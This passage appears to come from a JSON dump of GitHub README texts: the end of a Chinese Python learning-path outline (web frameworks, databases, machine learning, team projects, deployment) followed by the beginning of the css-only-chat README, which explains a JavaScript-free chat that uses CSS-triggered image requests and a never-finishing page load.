\u521b\u5efa\u751f\u6210\u5668\u7684\u4e24\u79cd\u65b9\u5f0f /\n\u5e76\u53d1\u548c\u5f02\u6b65\u7f16\u7a0b - \u591a\u7ebf\u7a0b / \u591a\u8fdb\u7a0b / \u5f02\u6b65IO / async\u548cawait\n\nDay21~30 - Web\u524d\u7aef\u5165\u95e8\n\n\u7528HTML\u6807\u7b7e\u627f\u8f7d\u9875\u9762\u5185\u5bb9\n\u7528CSS\u6e32\u67d3\u9875\u9762\n\u7528JavaScript\u5904\u7406\u4ea4\u4e92\u5f0f\u884c\u4e3a\njQuery\u5165\u95e8\u548c\u63d0\u9ad8\nVue.js\u5165\u95e8\nElement\u7684\u4f7f\u7528\nBootstrap\u7684\u4f7f\u7528\n\nDay31~35 - \u73a9\u8f6cLinux\u64cd\u4f5c\u7cfb\u7edf\n\n\u64cd\u4f5c\u7cfb\u7edf\u53d1\u5c55\u53f2\u548cLinux\u6982\u8ff0\nLinux\u57fa\u7840\u547d\u4ee4\nLinux\u4e2d\u7684\u5b9e\u7528\u7a0b\u5e8f\nLinux\u7684\u6587\u4ef6\u7cfb\u7edf\nVim\u7f16\u8f91\u5668\u7684\u5e94\u7528\n\u73af\u5883\u53d8\u91cf\u548cShell\u7f16\u7a0b\n\u8f6f\u4ef6\u7684\u5b89\u88c5\u548c\u670d\u52a1\u7684\u914d\u7f6e\n\u7f51\u7edc\u8bbf\u95ee\u548c\u7ba1\u7406\n\u5176\u4ed6\u76f8\u5173\u5185\u5bb9\n\nDay36~40 - \u6570\u636e\u5e93\u57fa\u7840\u548c\u8fdb\u9636\n\n\u5173\u7cfb\u578b\u6570\u636e\u5e93MySQL\n\n\u5173\u7cfb\u578b\u6570\u636e\u5e93\u6982\u8ff0\nMySQL\u7684\u5b89\u88c5\u548c\u4f7f\u7528\nSQL\u7684\u4f7f\u7528\n\nDDL - \u6570\u636e\u5b9a\u4e49\u8bed\u8a00 - create / drop / alter\nDML - \u6570\u636e\u64cd\u4f5c\u8bed\u8a00 - insert / delete / update / select\nDCL - \u6570\u636e\u63a7\u5236\u8bed\u8a00 - grant / revoke\n\n\n\u76f8\u5173\u77e5\u8bc6\n\n\u8303\u5f0f\u7406\u8bba - \u8bbe\u8ba1\u4e8c\u7ef4\u8868\u7684\u6307\u5bfc\u601d\u60f3\n\u6570\u636e\u5b8c\u6574\u6027\n\u6570\u636e\u4e00\u81f4\u6027\n\n\n\u5728Python\u4e2d\u64cd\u4f5cMySQL\n\n\nNoSQL\u5165\u95e8\n\nNoSQL\u6982\u8ff0\nRedis\u6982\u8ff0\nMongo\u6982\u8ff0\n\n\n\nDay41~55 - \u5b9e\u6218Django\nDay41 - \u5feb\u901f\u4e0a\u624b\n\nWeb\u5e94\u7528\u5de5\u4f5c\u539f\u7406\u548cHTTP\u534f\u8bae\nDjango\u6846\u67b6\u6982\u8ff0\n5\u5206\u949f\u5feb\u901f\u4e0a\u624b\n\u4f7f\u7528\u89c6\u56fe\u6a21\u677f\n\nDay42 - \u6df1\u5165\u6a21\u578b\n\n\u5173\u7cfb\u578b\u6570\u636e\u5e93\u914d\u7f6e\n\u7ba1\u7406\u540e\u53f0\u7684\u4f7f\u7528\n\u4f7f\u7528ORM\u5b8c\u6210\u5bf9\u6a21\u578b\u7684CRUD\u64cd\u4f5c\nDjango\u6a21\u578b\u6700\u4f73\u5b9e\u8df5\n\u6a21\u578b\u5b9a\u4e49\u53c2\u8003\n\nDay43 - \u9759\u6001\u8d44\u6e90\u548cAjax\u8bf7\u6c42\n\n\u52a0\u8f7d\u9759\u6001\u8d44\u6e90\n\u7528Ajax\u8bf7\u6c42\u83b7\u53d6\u6570\u636e\n\nDay44 - \u8868\u5355\u7684\u5e94\u7528\nDay45 - Cookie\u548cSession\nDay46 - \u4e2d\u95f4\u4ef6\u7684\u5e94\u7528\nDay47 - \u65e5\u5fd7\u548c\u7f13\u5b58\nDay48 - \u6587\u4ef6\u4e0a\u4f20\u548c\u5bcc\u6587\u672c\u7f16\u8f91\nDay49 - \u6587\u4ef6\u4e0b\u8f7d\u548c\u62a5\u8868\nDay50 - RESTful\u67b6\u6784\u548cDRF\u5165\u95e8\nDay51 - RESTful\u67b6\u6784\u548cDRF\u8fdb\u9636\nDay52 - \u4f7f\u7528\u7f13\u5b58\nDay53 - \u77ed\u4fe1\u548c\u90ae\u4ef6\nDay54 - \u5f02\u6b65\u4efb\u52a1\u548c\u5b9a\u65f6\u4efb\u52a1\nDay55 - \u5355\u5143\u6d4b\u8bd5\u548c\u9879\u76ee\u4e0a\u7ebf\n\n\u9879\u76ee\u5f00\u53d1\u6d41\u7a0b\u548c\u76f8\u5173\u5de5\u5177\n\u751f\u6210\u975eHTML\u5185\u5bb9\n\u9879\u76ee\u90e8\u7f72\u548c\u6d4b\u8bd5\n\u9879\u76ee\u6027\u80fd\u521d\u6b65\u8c03\u4f18\nWeb\u5e94\u7528\u5b89\u5168\u4fdd\u62a4\n\nDay56~60 - \u5b9e\u6218Flask\nDay56 - Flask\u5165\u95e8\nDay57 - \u6a21\u677f\u7684\u4f7f\u7528\nDay58 - \u8868\u5355\u7684\u5904\u7406\nDay59 - \u6570\u636e\u5e93\u64cd\u4f5c\nDay60 - \u9879\u76ee\u5b9e\u6218\nDay61~65 - \u5b9e\u6218Tornado\nDay61 - \u9884\u5907\u77e5\u8bc6\n\n\u5e76\u53d1\u7f16\u7a0b\nI/O\u6a21\u5f0f\u548c\u4e8b\u4ef6\u9a71\u52a8\n\nDay62 - Tornado\u5165\u95e8\n\nTornado\u6982\u8ff0\n5\u5206\u949f\u4e0a\u624bTornado\n\u8def\u7531\u89e3\u6790\n\u8bf7\u6c42\u5904\u7406\u5668\n\nDay63 - \u5f02\u6b65\u5316\n\naiomysql\u548caioredis\u7684\u4f7f\u7528\n\nDay64 - WebSocket\u7684\u5e94\u7528\n\nWebSocket\u7b80\u4ecb\nWebSocket\u670d\u52a1\u5668\u7aef\u7f16\u7a0b\nWebSocket\u5ba2\u6237\u7aef\u7f16\u7a0b\n\u9879\u76ee\uff1aWeb\u804a\u5929\u5ba4\n\nDay65 - \u9879\u76ee\u5b9e\u6218\n\n\u524d\u540e\u7aef\u5206\u79bb\u5f00\u53d1\u548c\u63a5\u53e3\u6587\u6863\u7684\u64b0\u5199\n\u4f7f\u7528Vue.js\u5b9e\u73b0\u524d\u7aef\u6e32\u67d3\n\u4f7f\u7528ECharts\u5b9e\u73b0\u62a5\u8868\u529f\u80fd\n\u4f7f\u7528WebSocket\u5b9e\u73b0\u63a8\u9001\u670d\u52a1\n\nDay66~75 - \u722c\u866b\u5f00\u53d1\nDay66 - \u7f51\u7edc\u722c\u866b\u548c\u76f8\u5173\u5de5\u5177\nDay67 - \u6570\u636e\u91c7\u96c6\u548c\u89e3\u6790\nDay68 - \u5b58\u50a8\u6570\u636e\nDay69 - \u5e76\u53d1\u4e0b\u8f7d\nDay70 - \u89e3\u6790\u52a8\u6001\u5185\u5bb9\nDay71 - \u8868\u5355\u4ea4\u4e92\u548c\u9a8c\u8bc1\u7801\u5904\u7406\nDay72 - Scrapy\u5165\u95e8\nDay73 - Scrapy\u9ad8\u7ea7\u5e94\u7528\nDay74 - Scrapy\u5206\u5e03\u5f0f\u5b9e\u73b0\nDay75 - \u722c\u866b\u9879\u76ee\u5b9e\u6218\nDay76~90 - \u6570\u636e\u5904\u7406\u548c\u673a\u5668\u5b66\u4e60\nDay76 - \u673a\u5668\u5b66\u4e60\u57fa\u7840\nDay77 - Pandas\u7684\u5e94\u7528\nDay78 - NumPy\u548cSciPy\u7684\u5e94\u7528\nDay79 - Matplotlib\u548c\u6570\u636e\u53ef\u89c6\u5316\nDay80 - k\u6700\u8fd1\u90bb(KNN)\u5206\u7c7b\nDay81 - \u51b3\u7b56\u6811\nDay82 - \u8d1d\u53f6\u65af\u5206\u7c7b\nDay83 - \u652f\u6301\u5411\u91cf\u673a(SVM)\nDay84 - K-\u5747\u503c\u805a\u7c7b\nDay85 - \u56de\u5f52\u5206\u6790\nDay86 - \u5927\u6570\u636e\u5206\u6790\u5165\u95e8\nDay87 - \u5927\u6570\u636e\u5206\u6790\u8fdb\u9636\nDay88 - Tensorflow\u5165\u95e8\nDay89 - Tensorflow\u5b9e\u6218\nDay90 - \u63a8\u8350\u7cfb\u7edf\nDay91~100 - \u56e2\u961f\u9879\u76ee\u5f00\u53d1\n\u7b2c91\u5929\uff1a\u56e2\u961f\u5f00\u53d1\u548c\u9879\u76ee\u9009\u9898\n\n\n\u8f6f\u4ef6\u8fc7\u7a0b\u6a21\u578b\n\n\n\u7ecf\u5178\u8fc7\u7a0b\u6a21\u578b\uff08\u7011\u5e03\u6a21\u578b\uff09\n\n\u53ef\u884c\u6027\u5206\u6790\uff08\u7814\u7a76\u505a\u8fd8\u662f\u4e0d\u505a\uff09\uff0c\u8f93\u51fa\u300a\u53ef\u884c\u6027\u5206\u6790\u62a5\u544a\u300b\u3002\n\u9700\u6c42\u5206\u6790\uff08\u7814\u7a76\u505a\u4ec0\u4e48\uff09\uff0c\u8f93\u51fa\u300a\u9700\u6c42\u89c4\u683c\u8bf4\u660e\u4e66\u300b\u548c\u4ea7\u54c1\u754c\u9762\u539f\u578b\u56fe\u3002\n\u6982\u8981\u8bbe\u8ba1\u548c\u8be6\u7ec6\u8bbe\u8ba1\uff0c\u8f93\u51fa\u6982\u5ff5\u6a21\u578b\u56fe\u3001\u7269\u7406\u6a21\u578b\u56fe\u3001\u7c7b\u56fe\u3001\u65f6\u5e8f\u56fe\u7b49\u3002\n\u7f16\u7801 / \u6d4b\u8bd5\u3002\n\u4e0a\u7ebf / \u7ef4\u62a4\u3002\n\n\n\n\u654f\u6377\u5f00\u53d1\uff08Scrum\uff09- \u4ea7\u54c1\u6240\u6709\u8005\u3001Scrum Master\u3001\u7814\u53d1\u4eba\u5458 - Sprint\n\n\u4ea7\u54c1\u7684Backlog\uff08\u7528\u6237\u6545\u4e8b\u3001\u4ea7\u54c1\u539f\u578b\uff09\u3002\n\u8ba1\u5212\u4f1a\u8bae\uff08\u8bc4\u4f30\u548c\u9884\u7b97\uff09\u3002\n\u65e5\u5e38\u5f00\u53d1\uff08\u7ad9\u7acb\u4f1a\u8bae\u3001\u756a\u8304\u5de5\u4f5c\u6cd5\u3001\u7ed3\u5bf9\u7f16\u7a0b\u3001\u6d4b\u8bd5\u5148\u884c\u3001\u4ee3\u7801\u91cd\u6784\u2026\u2026\uff09\u3002\n\u4fee\u590dbug\uff08\u95ee\u9898\u63cf\u8ff0\u3001\u91cd\u73b0\u6b65\u9aa4\u3001\u6d4b\u8bd5\u4eba\u5458\u3001\u88ab\u6307\u6d3e\u4eba\uff09\u3002\n\u8bc4\u5ba1\u4f1a\u8bae\uff08Showcase\uff09\u3002\n\u56de\u987e\u4f1a\u8bae\uff08\u5f53\u524d\u5468\u671f\u505a\u5f97\u597d\u548c\u4e0d\u597d\u7684\u5730\u65b9\uff09\u3002\n\n\n\u8865\u5145\uff1a\u654f\u6377\u8f6f\u4ef6\u5f00\u53d1\u5ba3\u8a00\n\n\u4e2a\u4f53\u548c\u4e92\u52a8 \u9ad8\u4e8e \u6d41\u7a0b\u548c\u5de5\u5177\n\u5de5\u4f5c\u7684\u8f6f\u4ef6 \u9ad8\u4e8e \u8be6\u5c3d\u7684\u6587\u6863\n\u5ba2\u6237\u5408\u4f5c \u9ad8\u4e8e \u5408\u540c\u8c08\u5224\n\u54cd\u5e94\u53d8\u5316 \u9ad8\u4e8e \u9075\u5faa\u8ba1\u5212\n\n\n\n\n\n\n\u89d2\u8272\uff1a\u4ea7\u54c1\u6240\u6709\u8005\uff08\u51b3\u5b9a\u505a\u4ec0\u4e48\uff0c\u80fd\u5bf9\u9700\u6c42\u62cd\u677f\u7684\u4eba\uff09\u3001\u56e2\u961f\u8d1f\u8d23\u4eba\uff08\u89e3\u51b3\u5404\u79cd\u95ee\u9898\uff0c\u4e13\u6ce8\u5982\u4f55\u66f4\u597d\u7684\u5de5\u4f5c\uff0c\u5c4f\u853d\u5916\u90e8\u5bf9\u5f00\u53d1\u56e2\u961f\u7684\u5f71\u54cd\uff09\u3001\u5f00\u53d1\u56e2\u961f\uff08\u9879\u76ee\u6267\u884c\u4eba\u5458\uff0c\u5177\u4f53\u6307\u5f00\u53d1\u4eba\u5458\u548c\u6d4b\u8bd5\u4eba\u5458\uff09\u3002\n\u51c6\u5907\u5de5\u4f5c\uff1a\u5546\u4e1a\u6848\u4f8b\u548c\u8d44\u91d1\u3001\u5408\u540c\u3001\u61a7\u61ac\u3001\u521d\u59cb\u4ea7\u54c1\u9700\u6c42\u3001\u521d\u59cb\u53d1\u5e03\u8ba1\u5212\u3001\u5165\u80a1\u3001\u7ec4\u5efa\u56e2\u961f\u3002\n\u654f\u6377\u56e2\u961f\u901a\u5e38\u4eba\u6570\u4e3a8-10\u4eba\u3002\n\u5de5\u4f5c\u91cf\u4f30\u7b97\uff1a\u5c06\u5f00\u53d1\u4efb\u52a1\u91cf\u5316\uff0c\u5305\u62ec\u539f\u578b\u3001Logo\u8bbe\u8ba1\u3001UI\u8bbe\u8ba1\u3001\u524d\u7aef\u5f00\u53d1\u7b49\uff0c\u5c3d\u91cf\u628a\u6bcf\u4e2a\u5de5\u4f5c\u5206\u89e3\u5230\u6700\u5c0f\u4efb\u52a1\u91cf\uff0c\u6700\u5c0f\u4efb\u52a1\u91cf\u6807\u51c6\u4e3a\u5de5\u4f5c\u65f6\u95f4\u4e0d\u80fd\u8d85\u8fc7\u4e24\u5929\uff0c\u7136\u540e\u4f30\u7b97\u603b\u4f53\u9879\u76ee\u65f6\u95f4\u3002\u628a\u6bcf\u4e2a\u4efb\u52a1\u90fd\u8d34\u5728\u767d\u677f\u4e0a\u9762\uff0c\u767d\u677f\u4e0a\u5206\u4e09\u90e8\u5206\uff1ato do\uff08\u5f85\u5b8c\u6210\uff09\u3001in progress\uff08\u8fdb\u884c\u4e2d\uff09\u548cdone\uff08\u5df2\u5b8c\u6210\uff09\u3002\n\n\n\n\u9879\u76ee\u56e2\u961f\u7ec4\u5efa\n\n\n\u56e2\u961f\u7684\u6784\u6210\u548c\u89d2\u8272\n\n\u8bf4\u660e\uff1a\u8c22\u8c22\u4ed8\u7965\u82f1\u5973\u58eb\u7ed8\u5236\u4e86\u4e0b\u9762\u8fd9\u5f20\u7cbe\u7f8e\u7684\u516c\u53f8\u7ec4\u7ec7\u67b6\u6784\u56fe\u3002\n\n\n\n\n\u7f16\u7a0b\u89c4\u8303\u548c\u4ee3\u7801\u5ba1\u67e5\uff08flake8\u3001pylint\uff09\n\n\n\nPython\u4e2d\u7684\u4e00\u4e9b\u201c\u60ef\u4f8b\u201d\uff08\u8bf7\u53c2\u8003\u300aPython\u60ef\u4f8b-\u5982\u4f55\u7f16\u5199Pythonic\u7684\u4ee3\u7801\u300b\uff09\n\n\n\u5f71\u54cd\u4ee3\u7801\u53ef\u8bfb\u6027\u7684\u539f\u56e0\uff1a\n\n\u4ee3\u7801\u6ce8\u91ca\u592a\u5c11\u6216\u8005\u6ca1\u6709\u6ce8\u91ca\n\u4ee3\u7801\u7834\u574f\u4e86\u8bed\u8a00\u7684\u6700\u4f73\u5b9e\u8df5\n\u53cd\u6a21\u5f0f\u7f16\u7a0b\uff08\u610f\u5927\u5229\u9762\u4ee3\u7801\u3001\u590d\u5236-\u9ecf\u8d34\u7f16\u7a0b\u3001\u81ea\u8d1f\u7f16\u7a0b\u3001\u2026\u2026\uff09\n\n\n\n\n\n\u56e2\u961f\u5f00\u53d1\u5de5\u5177\u4ecb\u7ecd\n\n\u7248\u672c\u63a7\u5236\uff1aGit\u3001Mercury\n\u7f3a\u9677\u7ba1\u7406\uff1aGitlab\u3001Redmine\n\u654f\u6377\u95ed\u73af\u5de5\u5177\uff1a\u7985\u9053\u3001JIRA\n\u6301\u7eed\u96c6\u6210\uff1aJenkins\u3001Travis-CI\n\n\u8bf7\u53c2\u8003\u300a\u56e2\u961f\u9879\u76ee\u5f00\u53d1\u300b\u3002\n\n\n\u9879\u76ee\u9009\u9898\u548c\u7406\u89e3\u4e1a\u52a1\n\n\n\u9009\u9898\u8303\u56f4\u8bbe\u5b9a\n\n\nCMS\uff08\u7528\u6237\u7aef\uff09\uff1a\u65b0\u95fb\u805a\u5408\u7f51\u7ad9\u3001\u95ee\u7b54/\u5206\u4eab\u793e\u533a\u3001\u5f71\u8bc4/\u4e66\u8bc4\u7f51\u7ad9\u7b49\u3002\n\n\nMIS\uff08\u7528\u6237\u7aef+\u7ba1\u7406\u7aef\uff09\uff1aKMS\u3001KPI\u8003\u6838\u7cfb\u7edf\u3001HRS\u3001CRM\u7cfb\u7edf\u3001\u4f9b\u5e94\u94fe\u7cfb\u7edf\u3001\u4ed3\u50a8\u7ba1\u7406\u7cfb\u7edf\u7b49\u3002\n\n\nApp\u540e\u53f0\uff08\u7ba1\u7406\u7aef+\u6570\u636e\u63a5\u53e3\uff09\uff1a\u4e8c\u624b\u4ea4\u6613\u7c7b\u3001\u62a5\u520a\u6742\u5fd7\u7c7b\u3001\u5c0f\u4f17\u7535\u5546\u7c7b\u3001\u65b0\u95fb\u8d44\u8baf\u7c7b\u3001\u65c5\u6e38\u7c7b\u3001\u793e\u4ea4\u7c7b\u3001\u9605\u8bfb\u7c7b\u7b49\u3002\n\n\n\u5176\u4ed6\u7c7b\u578b\uff1a\u81ea\u8eab\u884c\u4e1a\u80cc\u666f\u548c\u5de5\u4f5c\u7ecf\u9a8c\u3001\u4e1a\u52a1\u5bb9\u6613\u7406\u89e3\u548c\u628a\u63a7\u3002\n\n\n\n\n\u9700\u6c42\u7406\u89e3\u3001\u6a21\u5757\u5212\u5206\u548c\u4efb\u52a1\u5206\u914d\n\n\u9700\u6c42\u7406\u89e3\uff1a\u5934\u8111\u98ce\u66b4\u548c\u7ade\u54c1\u5206\u6790\u3002\n\u6a21\u5757\u5212\u5206\uff1a\u753b\u601d\u7ef4\u5bfc\u56fe\uff08XMind\uff09\uff0c\u6bcf\u4e2a\u6a21\u5757\u662f\u4e00\u4e2a\u679d\u8282\u70b9\uff0c\u6bcf\u4e2a\u5177\u4f53\u7684\u529f\u80fd\u662f\u4e00\u4e2a\u53f6\u8282\u70b9\uff08\u7528\u52a8\u8bcd\u8868\u8ff0\uff09\uff0c\u9700\u8981\u786e\u4fdd\u6bcf\u4e2a\u53f6\u8282\u70b9\u65e0\u6cd5\u518d\u751f\u51fa\u65b0\u8282\u70b9\uff0c\u786e\u5b9a\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u7684\u91cd\u8981\u6027\u3001\u4f18\u5148\u7ea7\u548c\u5de5\u4f5c\u91cf\u3002\n\u4efb\u52a1\u5206\u914d\uff1a\u7531\u9879\u76ee\u8d1f\u8d23\u4eba\u6839\u636e\u4e0a\u9762\u7684\u6307\u6807\u4e3a\u6bcf\u4e2a\u56e2\u961f\u6210\u5458\u5206\u914d\u4efb\u52a1\u3002\n\n\n\n\n\u5236\u5b9a\u9879\u76ee\u8fdb\u5ea6\u8868\uff08\u6bcf\u65e5\u66f4\u65b0\uff09\n\n\n\n\u6a21\u5757\n\u529f\u80fd\n\u4eba\u5458\n\u72b6\u6001\n\u5b8c\u6210\n\u5de5\u65f6\n\u8ba1\u5212\u5f00\u59cb\n\u5b9e\u9645\u5f00\u59cb\n\u8ba1\u5212\u7ed3\u675f\n\u5b9e\u9645\u7ed3\u675f\n\u5907\u6ce8\n\n\n\n\n\u8bc4\u8bba\n\u6dfb\u52a0\u8bc4\u8bba\n\u738b\u5927\u9524\n\u6b63\u5728\u8fdb\u884c\n50%\n4\n2018/8/7\n\n2018/8/7\n\n\n\n\n\n\u5220\u9664\u8bc4\u8bba\n\u738b\u5927\u9524\n\u7b49\u5f85\n0%\n2\n2018/8/7\n\n2018/8/7\n\n\n\n\n\n\u67e5\u770b\u8bc4\u8bba\n\u767d\u5143\u82b3\n\u6b63\u5728\u8fdb\u884c\n20%\n4\n2018/8/7\n\n2018/8/7\n\n\u9700\u8981\u8fdb\u884c\u4ee3\u7801\u5ba1\u67e5\n\n\n\n\u8bc4\u8bba\u6295\u7968\n\u767d\u5143\u82b3\n\u7b49\u5f85\n0%\n4\n2018/8/8\n\n2018/8/8\n\n\n\n\n\n\n\n\u7b2c92\u5929\uff1a\u6570\u636e\u5e93\u8bbe\u8ba1\u548cOOAD\n\u6982\u5ff5\u6a21\u578b\u548c\u6b63\u5411\u5de5\u7a0b\n\n\nUML\uff08\u7edf\u4e00\u5efa\u6a21\u8bed\u8a00\uff09\u7684\u7c7b\u56fe\n\n\n\n\u901a\u8fc7\u6a21\u578b\u521b\u5efa\u8868\uff08\u6b63\u5411\u5de5\u7a0b\uff09\npython manage.py makemigrations app\npython manage.py migrate\n\n\n\u7269\u7406\u6a21\u578b\u548c\u53cd\u5411\u5de5\u7a0b\n\n\nPowerDesigner\n\n\n\n\u901a\u8fc7\u6570\u636e\u8868\u521b\u5efa\u6a21\u578b\uff08\u53cd\u5411\u5de5\u7a0b\uff09\npython manage.py inspectdb > app/models.py\n\n\n\u7b2c93-98\u5929\uff1a\u4f7f\u7528Django\u5f00\u53d1\u9879\u76ee\n\n\u8bf4\u660e\uff1a\u5177\u4f53\u5185\u5bb9\u8bf7\u53c2\u8003\u300aDjango\u77e5\u8bc6\u70b9\u6982\u8ff0\u300b\n\n\u9879\u76ee\u5f00\u53d1\u4e2d\u7684\u516c\u5171\u95ee\u9898\n\n\u6570\u636e\u5e93\u7684\u914d\u7f6e\uff08\u591a\u6570\u636e\u5e93\u3001\u4e3b\u4ece\u590d\u5236\u3001\u6570\u636e\u5e93\u8def\u7531\uff09\n\u7f13\u5b58\u7684\u914d\u7f6e\uff08\u5206\u533a\u7f13\u5b58\u3001\u952e\u8bbe\u7f6e\u3001\u8d85\u65f6\u8bbe\u7f6e\u3001\u4e3b\u4ece\u590d\u5236\u3001\u6545\u969c\u6062\u590d\uff08\u54e8\u5175\uff09\uff09\n\u65e5\u5fd7\u7684\u914d\u7f6e\n\u5206\u6790\u548c\u8c03\u8bd5\uff08Django-Debug-ToolBar\uff09\n\u597d\u7528\u7684Python\u6a21\u5757\uff08\u65e5\u671f\u8ba1\u7b97\u3001\u56fe\u50cf\u5904\u7406\u3001\u6570\u636e\u52a0\u5bc6\u3001\u4e09\u65b9API\uff09\n\nREST API\u8bbe\u8ba1\n\nRESTful\u67b6\u6784\n\n\u7406\u89e3RESTful\u67b6\u6784\nRESTful API\u8bbe\u8ba1\u6307\u5357\nRESTful API\u6700\u4f73\u5b9e\u8df5\n\n\nAPI\u63a5\u53e3\u6587\u6863\u7684\u64b0\u5199\uff08\u300a\u7f51\u7edcAPI\u63a5\u53e3\u8bbe\u8ba1\u300b\uff09\n\nRAP2\nYAPI\n\n\ndjango-REST-framework\u7684\u5e94\u7528\n\n\u9879\u76ee\u4e2d\u7684\u91cd\u70b9\u96be\u70b9\u5256\u6790\n\n\u4f7f\u7528\u7f13\u5b58\u7f13\u89e3\u6570\u636e\u5e93\u538b\u529b - Redis\n\u4f7f\u7528\u6d88\u606f\u961f\u5217\u505a\u89e3\u8026\u5408\u548c\u524a\u5cf0 - Celery + RabbitMQ\n\n\u7b2c99-100\u5929\uff1a\u6d4b\u8bd5\u548c\u90e8\u7f72\n\u5355\u5143\u6d4b\u8bd5\n\n\u6d4b\u8bd5\u7684\u79cd\u7c7b\n\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\uff08unittest\u3001pytest\u3001nose2\u3001tox\u3001ddt\u3001\u2026\u2026\uff09\n\u6d4b\u8bd5\u8986\u76d6\u7387\uff08coverage\uff09\n\n\u9879\u76ee\u90e8\u7f72\n\n\u8bf4\u660e\uff1a\u8bf7\u53c2\u8003\u300a\u9879\u76ee\u90e8\u7f72\u4e0a\u7ebf\u6307\u5357\u300b\u3002\n\n\n\u90e8\u7f72\u524d\u7684\u51c6\u5907\u5de5\u4f5c\n\n\u5173\u952e\u8bbe\u7f6e\uff08SECRET_KEY / DEBUG / ALLOWED_HOSTS / \u7f13\u5b58 / \u6570\u636e\u5e93\uff09\nHTTPS / CSRF_COOKIE_SECUR  / SESSION_COOKIE_SECURE\n\u65e5\u5fd7\u76f8\u5173\u914d\u7f6e\n\n\nLinux\u5e38\u7528\u547d\u4ee4\u56de\u987e\nLinux\u5e38\u7528\u670d\u52a1\u7684\u5b89\u88c5\u548c\u914d\u7f6e\nuWSGI/Gunicorn\u548cNginx\u7684\u4f7f\u7528\n\nGunicorn\u548cuWSGI\u7684\u6bd4\u8f83\n\n\u5bf9\u4e8e\u4e0d\u9700\u8981\u5927\u91cf\u5b9a\u5236\u5316\u7684\u7b80\u5355\u5e94\u7528\u7a0b\u5e8f\uff0cGunicorn\u662f\u4e00\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\uff0cuWSGI\u7684\u5b66\u4e60\u66f2\u7ebf\u6bd4Gunicorn\u8981\u9661\u5ced\u5f97\u591a\uff0cGunicorn\u7684\u9ed8\u8ba4\u53c2\u6570\u5c31\u5df2\u7ecf\u80fd\u591f\u9002\u5e94\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u3002\nuWSGI\u652f\u6301\u5f02\u6784\u90e8\u7f72\u3002\n\u7531\u4e8eNginx\u672c\u8eab\u652f\u6301uWSGI\uff0c\u5728\u7ebf\u4e0a\u4e00\u822c\u90fd\u5c06Nginx\u548cuWSGI\u6346\u7ed1\u5728\u4e00\u8d77\u90e8\u7f72\uff0c\u800c\u4e14uWSGI\u5c5e\u4e8e\u529f\u80fd\u9f50\u5168\u4e14\u9ad8\u5ea6\u5b9a\u5236\u7684WSGI\u4e2d\u95f4\u4ef6\u3002\n\u5728\u6027\u80fd\u4e0a\uff0cGunicorn\u548cuWSGI\u5176\u5b9e\u8868\u73b0\u76f8\u5f53\u3002\n\n\n\n\n\u865a\u62df\u5316\u6280\u672f\uff08Docker\uff09\n\n\u6027\u80fd\u6d4b\u8bd5\n\n\u8bf4\u660e\uff1a\u5177\u4f53\u5185\u5bb9\u8bf7\u53c2\u8003\u300aDjango\u77e5\u8bc6\u70b9\u6982\u8ff0\u300b\u3002\n\n\nAB\u7684\u4f7f\u7528\nSQLslap\u7684\u4f7f\u7528\nsysbench\u7684\u4f7f\u7528\n\n\u81ea\u52a8\u5316\u6d4b\u8bd5\n\n\u4f7f\u7528Shell\u548cPython\u8fdb\u884c\u81ea\u52a8\u5316\u6d4b\u8bd5\n\u4f7f\u7528Selenium\u5b9e\u73b0\u81ea\u52a8\u5316\u6d4b\u8bd5\n\nSelenium IDE\nSelenium WebDriver\nSelenium Remote Control\n\n\n\u6d4b\u8bd5\u5de5\u5177Robot Framework\u4ecb\u7ecd\n\n\u9879\u76ee\u6027\u80fd\u8c03\u4f18\n\n\n\u6570\u636e\u5e93\u6027\u80fd\u8c03\u4f18 - \u8bf7\u53c2\u8003\u300aMySQL\u76f8\u5173\u77e5\u8bc6\u300b\n\n\n\u8f6f\u786c\u4ef6\u4f18\u5316\n\n\nSQL\u4f18\u5316\n\n\n\u67b6\u6784\u4f18\u5316\n\n\n\u5206\u8868\u5206\u5e93\n\n\n\u4e3b\u4ece\u590d\u5236\uff0c\u8bfb\u5199\u5206\u79bb\n\n\n\u96c6\u7fa4\u67b6\u6784\n\n\n\n\n\n\nWeb\u670d\u52a1\u5668\u6027\u80fd\u4f18\u5316\n\n\nNginx\u8d1f\u8f7d\u5747\u8861\u914d\u7f6e\n\n\nKeepalived\u5b9e\u73b0\u9ad8\u53ef\u7528\n\n\n\n\n\u4ee3\u7801\u6027\u80fd\u8c03\u4f18\n\n\u591a\u7ebf\u7a0b\n\u5f02\u6b65\u5316\n\n\n\n\u9759\u6001\u8d44\u6e90\u8bbf\u95ee\u4f18\u5316\n\n\u4e91\u5b58\u50a8\nCDN\n\n\n\n\n\u81f4\u8c22\uff1a\u611f\u8c22\u7684\u6211\u7684\u540c\u4e8b\u53e4\u6654\u3001\u5f20\u65ed\u3001\u8096\u4e16\u8363\u3001\u738b\u6d77\u98de\u3001\u8363\u4f73\u4f1f\u3001\u8def\u4e30\u5764\u7b49\u5728\u6280\u672f\u4e0a\u7ed9\u4e88\u7684\u6307\u5bfc\u548c\u5e2e\u52a9\u3002"}, {"title": "kkuchta/css-only-chat", "language": "Ruby", "content": "CSS-Only Chat\nA truly monstrous async web chat using no JS whatsoever on the frontend.\n\nWait what\nThis is an asynchronous chat that sends + receives messages in the browser with no reloads and no javascript.\nOk so how\nBackground-images loaded via pseudoselectors + a forever-loading index page (remember Comet?).\nSay that again?\nOk, so there are two things we need the browser to do: send data and receive data.  Let's start with the first.\nSending Data\nCSS is really limited in what it can do.  However, we can use it to effectively detect button presses:\n.some-button:active {\n  background-image: url('some_image.jpg')\n}\n\nWhat's cool is that a browser won't actually load that background image until this selector is used - that is, when this button is pressed.  So now we have a way to trigger a request to a server of our choice on a button press.  That sounds like data sending!\nNow, of course, this only works once per button (since a browser won't try to load that image twice), but it's a start.\nReceiving Data\nSince we can't use JS, it's really hard to change a page after it's already been loaded.  But it is possible.\nBack before websockets were widely supported, we had to use clever hacks if we wanted to push data from a server to a client in an ongoing basis.  One such hack was just to make the page never finish loading.  It turns out that you can tell the browser to start rendering a page before it's finished loading (using the Transfer-Encoding: chunked http header).  And when you do that, you don't actually have to stop loading the page.  You can just keep adding stuff to the bottom of the html forever, at whatever rate you want.\nSo, for example, you could start sending a normal html page, then just stop sending html (while still telling the client you're sending) until you're ready to deliver another message.\nNow, all this lets us do is periodically append html to the page.  What can we do with that?  How about, when you load the index page, this happens:\n\nWe load up the first pile of html we want to show.  A welcome message, etc.\nWe stop loading html for a while until we want to send some sort of update.\nNow 